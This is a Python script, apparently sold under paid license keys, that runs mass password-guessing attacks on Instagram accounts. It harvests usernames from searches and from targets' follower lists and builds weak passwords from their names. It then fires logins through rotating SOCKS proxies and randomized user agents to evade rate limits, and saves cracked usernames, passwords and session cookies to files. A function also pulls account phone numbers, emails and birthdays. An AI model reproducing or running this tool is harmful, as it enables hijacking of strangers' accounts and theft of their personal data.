# coding:utf-8
#/usr/bin/python
try:
    import json
    import uuid
    import hmac
    import random
    import hashlib
    import urllib
    import stdiomask
    import urllib.request
    import calendar
except ImportError as e:
    exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall')
    
###----------[ IMPORT MODULE AND INGREDIENT ]---------- ###
import rich
from rich.markdown import Markdown
import os, sys, subprocess, platform
import os
try:
    import requests
except ImportError:
    print('\n [×] Modul requests belum terinstall!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Modul Futures belum terinstall!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Modul Bs4 belum terinstall!...\n')
    os.system('pip install bs4')

try:
	import stdiomask
except ImportError:
	catet_mask = ('# • sedang menginstall modul stdiomask •')
	mask = rich.markdown.Markdown(catet_mask, style='green')
	rich.console.Console().print(mask)
	os.system('pip install stdiomask')
	
bff_2 = open(os.devnull, "w")
my_music = subprocess.call(["dpkg","-s","play-audio"],stdout=bff_2,stderr=subprocess.STDOUT)
bff_2.close()
if my_music !=0:
	catet_play = ('# • sedang menginstall play-audio •')
	play = rich.markdown.Markdown(catet_play, style='green')
	rich.console.Console().print(play)
	os.system('pkg install play-audio')
import requests,bs4,json,os,sys,random,datetime,time,re
try:
    import rich
except ImportError:
    os.system('pip install rich')
    time.sleep(1)
    try:
        import rich
    except ImportError:
        exit('Tidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from time import sleep
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from bs4 import BeautifulSoup as parser
import time
###----------[ IMPORT RICH AND INGREDIENT ]---------- ###
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich import print as printer
from rich.console import Console
from rich.console import Console as sol
from rich.table import Table
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
console = Console()
day=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10
current_GMT = time.gmtime(time.time())
insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'
menudump=[]
def folder():
	try:os.mkdir('data')
	except:pass
	try:os.mkdir('result')
	except:pass
	
    
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    print('GAGAL')
    
prox=open('.prox.txt','r').read().splitlines()
CY='\033[96;1m'
H='\033[1;32m' #HIJAU
M='\033[1;31m' #MERAH
K='\033[1;33m' #KUNING
U='\033[1;35m' #UNGU
O='\033[38;2;255;127;0;1m' #ORANGE
C='\033[0m' #CLEAR
N = '\x1b[0m' # WARNA MATI
USN="Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 213.1.0.22.117 (iPhone13,2; iOS 15_0_2; en_US; en-US; scale=3.00; 1170x2532; 332048479)"
# USN="Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei Social Phone Build/HWIX3) AppleWebKit/533.1 (KHTML, like Gecko) Dolphin/10.1.1005.22 Mobile Safari/533.1"

internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
s=requests.Session()
# CLEAR
def clear():
    os.system('clear')
 
###----------[ GET TIME ]---------- ###
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi Tuan"
	elif 12 <= hours < 15:timenow = "Selamat Siang Tuan"
	elif 15 <= hours < 18:timenow = "Selamat Malam Tuan"
	else:timenow = "Selamat Malam Tuan"
	return timenow


###----------[ LOGO ]---------- ###
def banner():
    os.system('clear')
    print("""\033[31m_  _ ____ ____ _  _ ____ ____ ____ ____ _  _ 
|\ | | __ |___ |\ | |    |__/ |__| |    |_/  
\033[0m| \| |__] |___ | \| |___ |  \ |  | |___ | \_ %s
"""%(waktu()))

try:
    # python 2
    urllib_quote_plus = urllib.quote
except:
    # python 3
    urllib_quote_plus = urllib.parse.quote_plus
 
def User_Agent():
	dpi_phone = [
		'133','320','515','160','640','240','120'
		'800','480','225','768','216','1024','155']
	model_phone = [
		'Nokia 2.4','HUAWEI','Galaxy',
		'Unlocked Smartphones','Nexus 6P',
		'Mobile Phones','Xiaomi',
		'samsung','OnePlus','ZTE','Google Pixel 4','BlackBerry']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x2340','1320x2400','1242x2688']
	i_version = [
		'114.0.0.20.2','114.0.0.38.120',
		'114.0.0.20.70','114.0.0.28.120',
		'114.0.0.0.24','114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)'
	return User_Agent

def cekAPI(cookie):
    user=open('.username','r').read()
    try:
        c=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
        i=c.json()["data"]["user"]
        nama=i["full_name"]
        followers=i["edge_followed_by"]["count"]
        following=i["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        wel='# Instagram Checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        time.sleep(4)
        os.remove('.kukis.log')
        os.remove('.username')
        exit()

    return external,user

def login_kamu():
    if "sukses" in lisensiku:
        try:
            kuki=open('.kukis.log','r').read()
        except FileNotFoundError:
            banner()
            print('[1] Login Menggunakan Cookie\n[2] Login Menggunakan Username & Password')
            loginpil=input(f"\n[•] Pilih > {C} ")
            if loginpil=='1':
                print('\n[!] Gunakan username dan cookies instagram untuk login !\n[!] Sebelum login pastikan akun bersifat publik bukan privat !')
                us=input(f'\n[•] Masukkan Username > {C}')
                cok=input(f'[•] Masukkan Cookie > {C}')
                kuki=open('.kukis.log','w').write(cok)
                user=open('.username','w').write(us)
                print(f"[•] Login Succes.... \n[•] Run Again.... ")
                sleep(2.3)
                exit()
            elif loginpil == '2':
                login()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        instagram(ex,user,cookie).menu()
    else:
        login()
def login():
    global external
    try:
        print('\n[!] Gunakan username dan password instagram untuk login !\n[!] Sebelum login pastikan akun bersifat publik bukan privat !')
        us=input(f"[•] Username: {C}")
        pw=stdiomask.getpass(prompt=f'[•] Password: {C}')
    except KeyboardInterrupt:
        wel = '# KeyboardInterrupt terdeteksi... keluar !'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        exit()
    x=instagramAPI(us,pw).loginAPI()
    if x.get('status')=='success':
        open('.username','a').write(us)
        open('.kukis.log','a').write(x.get('cookie'))
        cookie={'cookie':x.get('cookie')}
        print(f'\n{H}>{C} Login berhasil')
        login_kamu()
    elif x.get('status')=='checkpoint':
        wel = '# Login checkpoint'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        login()
    else:
        wel = '# Username atau password yang anda masukan salah'
        wel2 = mark(wel, style='red')
        sol().print(wel2)
        login()


class instagram:
    def __init__(self,external,username,cookie):
        self.ext=external
        self.username=username
        self.cookie=cookie
        self.s=requests.Session()
    def logo(self):
        for i in external:
            try:
                nama=i.split('|')[0]
                followers=i.split('|')[1]
                following=i.split('|')[2]
            except:
                pass
            banner()
            welcome=f'''[{H}•{C}] Pembuat   : breaksek - Premium
[{H}•{C}] Username  : {self.username}
[{H}•{C}] Followers : {followers} • {following}'''
            print(welcome)
            print('''\n[1] Crack Dari Pencarian     [2] Crack Dari Pengikut    
[3] Crack Dari Mengikuti     [4] Check Status Crack
[5] Lihat Hasil Crack        [6] Bot Auto Unfollow
[7] Laporkan Bug             [8] logout''')
            


    def BUG(self):
        print('\n[•] Info Tambahkan Tanda + Untuk Spasi Pesan');print('[•] Masukan Pesan Untuk Di Kirim Ke Admin')
        i=input('[•] Pesan : ')
        print('[•] Pesan Anda : \033[32m%s \033[0mAkan Segera Terkirim Mohon Tunggu....'%(i));time.sleep(2)
        os.system('xdg-open https://wa.me/6287838563349?text=%s'%(i))
        exit()

    def ChangeLog(self):
        io='[1] Fix bug login instagram\n[2] Ganti tampilan scripts\n[3] Fix bug lisensi invalid'
        oi = nel(io, style='magenta')
        cetak(nel(oi, title='Fitur yang di update'))

        io='[1] Bot unfollow instagram\n[2] Bot spam komen'
        oi = nel(io, style='cyan')
        cetak(nel(oi, title='Fitur tambahan'))

        io='[1] Untuk fitur brute force masih dalam perbaikan\n[2] Untuk fitur Bot unfollow masih dalam perbaikan\n[3] Untuk fitur bot komen masih dalam perbaikan'
        oi = nel(io, style='magenta')
        cetak(nel(oi, title='Fix Bug'))
        exit()

    def Exit(self):
        x=input(f'\n[•] Apakah anda ingin keluar y/t > ')
        if x in ('y','Y'):
            os.remove('.kukis.log')
            os.remove('.username')
            login_kamu()
        elif x in ('t','T'):
            login_kamu()
        else:
            self.Exit()

    def sixAPI(self,six_id):
        url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1"
        x = requests.get(url)
        x_jason = x.json()
        uid = str( x_jason['users'][0].get("user").get("pk") )
        return uid

    def unfollowAPI(self,user_id,username_id,cookie):
        uuid=generateUUID(True)
        xx=self.s.get("https://www.instagram.com/",headers={"user-agent":USN}).content
        crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0]
        s.headers.update({'Connection': 'close',
                       'Accept': '*/*',
                       'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                       'Cookie2': '$Version=1',
                       'Accept-Language': 'en-US',
                       'User-Agent': USN})

        data = json.dumps({'_uuid': uuid,
                           '_uid': username_id,
                           'user_id': user_id,
                           '_csrftoken': crf_token})

        self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
            self.generateUUID(False),
            urllib.request.quote(data))
        return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text


    def searchAPI(self,cookie,nama):
        try:
            x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
            x_jason=json.loads(x.text)
            for i in x_jason['users']:
                user=i['user']
                username=user['username']
                fullname=user['full_name']
                internal.append(f'{username}|{fullname}')
        except requests.exceptions.ConnectionError:
            exit(f'\n [{M}!{C}] Koneksi internet bermasalah')
        return internal

    def idAPI(self,cookie,id):
        if 'sukses' in lisensiku:
            try:
                m=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
                m_jason=m.json()["data"]["user"]
                idx=m_jason["id"]
            except requests.exceptions.ConnectionError:
                exit(f"\n{M}[!] Koneksi internet bermasalah{C}")
            except Exception as e:
                exit(f"\n{M}[!] Username yang anda masukan tidak di temukan pastikan target bersifat publik{C}")
            return idx
        else:lisensi()

    def infoAPI(self,cookie,api,id):
        if 'sukses' in  lisensiku:
            try:
                print('\n[•] Tunggu Sedang Mengumpulkan User')
                x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
                x_jason=json.loads(x.text)
                for i in x_jason['users']:
                    username = i["username"]
                    nama = i["full_name"]
                    internal.append(f'{username}|{nama}')
                    following.append(username)
                if 'pengikut' in menudump:
                    maxid=x_jason['next_max_id']
                    for z in range (9999):
                        x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
                        x_jason=json.loads(x.text)
                        try:
                            for i in x_jason['users']:
                                username = i["username"]
                                nama = i["full_name"]
                                internal.append(f'{username}|{nama}')
                                following.append(username)
                            try:
                                 maxid=x_jason['next_max_id']
                            except:
                                break
                        except:
                            if 'challenge' in x.text:
                                break
                            else:
                                continue
                else:pass
            except requests.exceptions.ConnectionError:
                exit(f'[•] Koneksi internet bermasalah{C}')
            except Exception as e:
                print(f'[•] Username yang anda masukan tidak di temukan{C}')
            return internal
        else:lisensi()

    def passwordAPI(self,xnx):
        print('[•] Total User : %s\n'%(len(internal)))
        print('[1] FirstName123 Firstname1234\n[2] FirtsName123 Firstname1234 Firstname12345 FullName\n[3] FirstName+123,FullName,Full Name\n[4] Password Manual\n')
        c=input(f'[•] Password : ')
        if c=='1':
            self.generateAPI(xnx,c)
        elif c=='2':
            self.generateAPI(xnx,c)
        elif c=='3':
            self.generateAPI(xnx,c)
        elif c=='7':
            self.generateAPI(xnx,c)
        elif c=='4':
            ui='# PASSWORD MANUAL'
            uu=mark(ui,style='')
            sol().print(uu)
            print(f'{M} Contoh sayang,anjing,bangsat')
            print('')
            zx=input(f'{CY}[•] List password :{C} ')
            self.generateAPI(xnx,c,zx)
        else:
            self.passwordAPI(xnx)

    def generateAPI(self,user,o,zx=''):
        global prog,des
        prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
        des = prog.add_task('',total=len(internal))
        print('\n[•] Hasil OK disimpan ke: result/%s.txt\n[•] Hasil CP disimpan ke: result/%s.txt'%(day,day))
        print('[•] Jika alamat IP di-spam, aktifkan mode pesawat selama 10 detik\n')
        with prog:
            with ThreadPoolExecutor(max_workers=15) as shinkai:
                for i in user:
                    try:
                        username=i.split("|")[0]
                        password=i.split("|")[1].lower()
                        for w in password.split(" "):
                            if len(w)<3:
                                continue
                            else:
                                w=w.lower()
                            if o=="1":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234']
                                else:
                                    sandi=[w]
                            elif o=="2":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w,w+'1234',w+'12345',w+'123456']
                                else:
                                    sandi=[w+'123',w,w+'1234',w+'12345',w+'123456']
                            elif o=="3":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w,w+'123',w+'1234',w+'12345',w+'123456','1234567',password.lower()]
                                else:
                                    sandi=[w+'123',w,password.lower()]
                            elif o=="7":
                                if len(w)==3 or len(w)==4 or len(w)==5:
                                    sandi=[w+'123',w+'1234',w+'12345',w]
                                else:
                                    sandi=[w+'123',w+'1234',w+'12345',password.lower()]
                            elif o=="4":
                                if len(zx) > 3:
                                    sandi = zx.replace(" ", "").split(",")
                                else:
                                    break
                            shinkai.submit(self.crackAPI,username,sandi)
                    except:
                        pass
        print('\n[•] Crack Selesai Tod.......')
        exit()

    def APIinfo(self,user):
        try:
            x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
            x_jason=x.json()["data"]["user"]
            nama=x_jason["full_name"]
            pengikut=x_jason["edge_followed_by"]["count"]
            mengikut=x_jason["edge_follow"]["count"]
            postingan=x_jason["edge_owner_to_timeline_media"]["count"]
        except:
            pass

        return nama,pengikut,mengikut,postingan

    def crackAPI(self,user,pas):
        global loop,success,checkpoint
        prog.update(des,description=f"crack {str(loop)}/{len(internal)} OK : {H}{len(success)}{N} CP : {K}{len(checkpoint)}{N}")
        prog.advance(des)
        try:
            for pw in pas:
                ts = calendar.timegm(current_GMT)
                nip=random.choice(prox)
                proxs= {'http': 'socks5://'+nip}
                aa='Mozilla/5.0 (Linux; Android'
                b=random.choice(['4','5','6','7','8','9','10','11','12'])
                c='BRAVIA 2K GB ATV3)'
                d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                e=random.randrange(1, 999)
                f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132'
                h=random.randrange(73,100)
                i='0'
                j=random.randrange(4200,4900)
                k=random.randrange(40,150)
                l='Mobile Safari/537.36'
                uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
                token=s.get('https://www.instagram.com/web/__mid')
                headers = {
                    'Host':'www.instagram.com',
                    'connection':'keep-alive',
                    'sec-ch-ua':'";Not A Brand";v="99", "Chromium";v="94"',
                    'x-ig-app-id':'1217981644879628',
                    'x-ig-www-claim':'0',
                    'sec-ch-ua-mobile': '?1',
                    'x-instagram-ajax':'4b5f8c8eb791',
                    'content-type':'application/x-www-form-urlencoded',
                    'accept':'*/*',
                    'x-requested-with':'XMLHttpRequest',
                    'x-asbd-id':'198387',
                    'user-agent':uaku,
                    'x-csrftoken':token.cookies['csrftoken'],
                    'sec-ch-ua-platform': '"Android"',
                    'origin':'https://www.instagram.com',
                    'sec-fetch-site':'same-origin',
                    'sec-fetch-mode':'cors',
                    'sec-fetch-dest':'empty',
                    'referer':'https://www.instagram.com/accounts/login/?next=/graphql/query/',
                    'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
                param={
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
                    "username": user,
                    "queryParams": "{}",
                    "optIntoOneTap": 'false',
                    "stopDeletionNonce": "",
                    "trustedDeviceRecords": "{}"}
                x=s.post("https://www.instagram.com/accounts/login/ajax/",headers=headers,data=param,proxies=proxs)
                x_jason=json.loads(x.text)
                if "userId" in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    coki  = ";".join([key+"="+value.replace('"','') for key, value in x.cookies.get_dict().items()])
                    tree = Tree("")
                    tree.add(f"\r{H}{nama} | {user}{N}")
                    tree.add(f"\r{N}Pengikut  : {H}{pengikut}{N}")
                    tree.add(f"\r{N}Mengikuti : {H}{mengikut}{N}")
                    tree.add(f"\r{N}Postingan : {H}{postingan}{N}").add(f"\r{N}Token : {H}{coki}{N}")
                    prints(tree)
                    open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}|{coki}\n')
                    success.append(user)
                    #os.popen("play-audio data/dapet.mp3")
                    break
                elif 'checkpoint_url' in str(x_jason):
                    nama,pengikut,mengikut,postingan=self.APIinfo(user)
                    tree = Tree("")
                    tree.add(f"\r{M}{nama} | {user} {N} ")
                    tree.add(f"\r{N}Pengikut  : {K}{pengikut}{N}")
                    tree.add(f"\r{N}Mengikuti : {K}{mengikut}{N}")
                    tree.add(f"\r{N}Postingan : {H}{postingan}{N}")
                    prints(tree)
                    open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                    checkpoint.append(user)
                    break
                else:
                    continue
            loop+=1
        except:
            self.crackAPI(user,pas)
            
    def checkAPI(self,user,pw):
        try:
            token=s.get("https://www.instagram.com/",headers={"user-agent":USN}).content
            crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
            s.headers.update({
                'authority': 'www.instagram.com',
                'x-ig-www-claim': 'hmac.AR3CH3q3WF_EHwNgjQj_uhjG15AF1ckFwoqU4QVfeHdOiBCT',
                'x-instagram-ajax': '82a581bb9399',
                'content-type': 'application/x-www-form-urlencoded',
                'accept': '*/*',
                'user-agent': USN,
                'x-requested-with': 'XMLHttpRequest',
                'x-csrftoken': crf_token,
                'x-ig-app-id': '936619743392459',
                'origin': 'https://www.instagram.com',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://www.instagram.com/',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'
            })

            param={
                "username": user,
                "enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999),pw),
                "optIntoOneTap": False,
                "queryParams": {},
                "stopDeletionNonce": "",
                "trustedDeviceRecords": {}
            }
            x=s.post("https://www.instagram.com/accounts/login/ajax/",data=param);sleep(1)
            x_jason=json.loads(x.text)
            if "userId" in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                coki  = ";".join([key+"="+value.replace('"','') for key, value in x.cookies.get_dict().items()])
                tree = Tree("")
                tree.add(f"\r{H}{user} | {pw}{N}")
                tree.add(f"\r{N}Pengikut  : {H}{pengikut}{N}")
                tree.add(f"\r{N}Mengikuti : {H}{mengikut}{N}")
                tree.add(f"\r{N}Postingan : {H}{postingan}{N}").add(f"\r{N}Token : {H}{coki}{N}")
                prints(tree)
                open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}|{coki}\n')
                success.append(user)
                #os.popen("play-audio data/dapet.mp3")
                #os.popen("play-audio data/dapet.mp3")

            elif 'checkpoint_url' in x.text:
                nama,pengikut,mengikut,postingan=self.APIinfo(user)
                tree = Tree("")
                tree.add(f"\r{M}{user} | {pw} {N} ")
                tree.add(f"\r{N}Pengikut  : {K}{pengikut}{N}")
                tree.add(f"\r{N}Mengikuti : {K}{mengikut}{N}")
                tree.add(f"\r{N}Postingan : {H}{postingan}{N}")
                prints(tree)
                open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
                checkpoint.append(user)
                

            elif 'Please wait a few minutes' in str(x.text):
                sys.stdout.write(f"\r {U}!{C}] {U}Please wait a few minutes second{C}");sys.stdout.flush();sleep(10)
                self.checkAPI(user,pw)
        except:
            self.checkAPI(user,pw)

    def menu(self):
        self.logo()
        c=input(f'\n[•] Masukkan : ')
        if c=='':
            self.menu()
        elif c in ('1','01'):
            print('\n[•] Masukan Jumlah Pencarian !');m=int(input(f'[•] Jumlah : '));print('')
            print('[•] Masukan Nama Randome')
            for i in range(m):
                i+1
                nama=input(f'[•] Masukan nama ({H}{len(internal)}{C}): ')
                name=self.searchAPI(self.cookie,nama)
            self.passwordAPI(name)

        elif c in ('2','02'):
            print('\n[•] Pastikan Target Instagram Anda Publick')
            mas=input('[•] Anda ingin crack masal? y/t >  ')
            if mas in ['y','Y']:
                masal(self)
            elif mas in ['t','T']:
                massal(self)
            elif mas in ['']:
                print('Isi Tod !, Jangan Di Kosongin!')


        elif c in ('3','03'):
            print('\n[•] Pastikan Target Instagram Anda Publick')
            mas=input('[•] Anda ingin crack masal? y/t >  ')
            if mas in ['y','Y']:
                mengi(self)
            elif mas in ['t','T']:
                meng(self)
            elif mas in ['']:
                print('Isi Tod !, Jangan Di Kosongin!')


        elif c in ('4','04'):
            print('')
            for i in os.listdir('result'):
                print(f'•-> {i}')
            c=input(f'\n[•] Masukan nama file: {C}')
            g=open("result/%s"%(c)).read().splitlines()
            print(f'\n[•] Total Result Asepitgans {H}{len(g)}{C}')
            print(f'[•] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                self.checkAPI(usr,pwd)
            exit(f'\n\n{K}[#] proses check selesai...{C}')

        elif c in ('5','05'):
            print('')
            for i in os.listdir('result'):
                print(f'•-> {i}')
            c=input(f'\n[•] Masukan nama file: ')
            g=open("result/%s"%(c)).read().splitlines()
            xx=c.split("-")
            xc=xx[0]
            print(f'[•] Total result yang di temukan [{H}{len(g)}{C}]')
            for s in g:
                usr=s.split("|")[0]
                pwd=s.split("|")[1]
                fol=s.split("|")[2]
                ful=s.split("|")[3]
                if xc=="checkpoint":
                    print(f"""\r\n  {C}*--> Login Checkpoin\_> {M}Gak{C}
  {M}{C}*-->{C} Username  : {M}{usr}{C} - {M}{pwd}{C}
  {M}{C}*-->{C} Pengikut  : {M}{ful}{C} - {M}{fol}{C}
                    """);sleep(0.05)
                else:
                    print(f"""\r\n {C} *--> Login Berhasil\_> {H}Ok{C}
  {H}{C}*-->{C} Username  : {H}{usr}{C} - {H}{pwd}{C}
  {H}{C}*-->{C} Pengikut  : {H}{fol}{C} - {H}{ful}{C}
                    """);sleep(0.05)
        elif c in ('6','06'):
        	print('[•] Sedang Dalam Perbaikan')
        elif c in ('6','06'):
            global following
            six=0
            print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
            x=open('.kukis.log','r').read()
            x_id=re.findall('sessionid=(\d+)',x)[0]
            back=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id)
            for i in following:
                six+=1
                sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
                six_id=self.sixAPI(i)
                print(f' {str(six)}{U}}}{C} {i} {H}Unfollow-Berhasil{C}')
                self.unfollowAPI(six_id,'5452333948',self.cookie)
                #print(w)
            input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()

        elif c in ('7','07'):
            self.BUG()
      #  elif c in ('c','C'):
         #   self.ChangeLog()
        elif c in ('8','08'):
            self.Exit()

        else:
            self.menu()
            
          
def informasipribadi(self, cookies, useragent):
        self.url = 'https://i.instagram.com/api/v1/accounts/edit/web_form_data/'
        response = requests.get(self.url, {
            'user-agent': useragent,
            'cookie': cookies }, **('headers',)).json()['form_data']
        self.nomor = response['phone_number'].replace('-', '').replace(' ', '')
        self.email = response['email']
        self.birthday = response['birthday'].replace('-', '/')
        return {
            'nomor': self.nomor,
            'email': self.email,
            'birthday': self.birthday }
            
def mengi(self):
            try:
                menudump.append('pengikut')
                print('\n[•] Target harus bersifat publik jangan privat')
                m=int(input(f'[•] Jumlah : {N}'))
            except:m=1
            for t in range(m):
                t +=1
                nama=input(f'[{t}] Masukan Username : ')
                print('[•] Total User : %s'%(len(internal)))
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
            self.passwordAPI(info)

def meng(self):
    m=input(f'[•] Username : ')

    id=self.idAPI(self.cookie,m)
    info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
    self.passwordAPI(info)

def masal(self):
            try:
                menudump.append('pengikut')
                print('\n[•] Target harus bersifat publik jangan privat')
                m=int(input(f'[•] Jumlah : '))
            except:m=1
            for t in range(m):
                t +=1
                print('[•] Total User : %s'%({len(internal)}))
                nama=input(f'[{t}] Masukan Username : ')
                id=self.idAPI(self.cookie,nama)
                info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)



def massal(self):
            menudump.append('pengikut')
           # print('\n[•] Target harus bersifat publik jangan privat')
            m=input(f'[•] Username : ')

            id=self.idAPI(self.cookie,m)
            info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
            self.passwordAPI(info)

kentod = random.choice(["MORHE-UUQDM-OOFJR-IBRJZ","ASE-SIPAL-ING-GANSKUIT","LIMPL-XDZGC-NNVDR-NXGXK","LHEZL-RPKJG-IPPOR-YWXGV","JOJQR-GKFVW-VLYJT-UNITI","GSNEP-NTRCE-CTKYK-OIAGD","LTQVM-NRQSC-LVJCL-SVQTD","HCYUY-ADXUB-MPCVJ-DGNQE","JHSQH-YAYOT-WDWFU-FAYIV","MTIRZ-YXKRT-ZEYGN-UWJMK","LWGOO-ZPRNJ-FKDXT-YNBZB","GTSCS-MEXZL-YXMLX-NLUCT","KWQRM-ROFYY-YLBST-BKXAE","LISBX-TPVSB-WXKEV-XOMIB","JVFEN-WKCFP-XLLXV-GAKUS","LEHBK-GBLHK-NACGN-EEHUW","KAEPL-IBDPP-WQYGN-PMUSI","KVIZG-ILJVO-EKFYT-THGKZ"])


kentodd=random.choice([kentod])


crot=(kentodd)

def getkey():
    import json, requests
    try:
        openkey = open(".key.txt","r").read()
        files = openkey.split("\n")[1]
        key = openkey.split("\n")[0]
    except FileNotFoundError:
        #os.system("clear")
        #none();time.sleep(1)
        print("\n\033[0m•> Author breaksek ")
        print("\033[0m•> License Anda Tidak Tersedia ");time.sleep(2)
        print("\n~> 100k : 1 bulan\n~> 50k : 2 minggu\n~> 25k : 1 Minggu")
        print ("")
        print("\033[0m•> license anda :\033[32m "+crot);time.sleep(1)
        namamu = input("\033[0m•> nama anda : ")
        yt = input("\033[0m•> Chat Admin Untuk Beli Lisensi y/t? > ")
        if yt in ["Y","y"]:
            os.system("xdg-open https://wa.me/+918824167482?text=Hai+bg+rif,+aku+mau+beli+scriptnya+tapi+yang+versi+premium.+Ini+lisensinya:%20"+crot+"+konfirmasi+nama+pembeli:%20"+namamu)
            open(".key.txt","w").write(crot+"\n"+namamu)
            exit()
        else:
            exit("\033[0m•> Telah keluar program")
    try:
        confirmkey = requests.get("https://github.com/Billa303/APROVAL2/blob/main/Updatebookmark.txt").json()
    except requests.exceptions.ConnectionError:
        print("\033[0m[!] Jaringan Internet Kamu Tidak Ada");exit()
    if confirmkey[files] == key:
        if confirmkey[files] == "tidakada":
            print("\n\033[0m~> Lisensi key Kamu Sudah Kadaluarsa <~")
            os.system("rm -rf .key.txt");exit()
        else:
        	print("\n\033[0m~> Lisensi key Kamu Sudah Aktif <~");time.sleep(1);login_kamu()
    else:
        print("\n\033[0m╰─ Lisensi key Kamu Sudah Kadaluarsa")
        os.system("rm -rf .key.txt");exit()

import requests, json

P = '\x1b[1;97m'
M = '\x1b[0;31m'
H = '\x1b[0;32m'
K = '\x1b[0;33m'
B = '\x1b[0;34m'
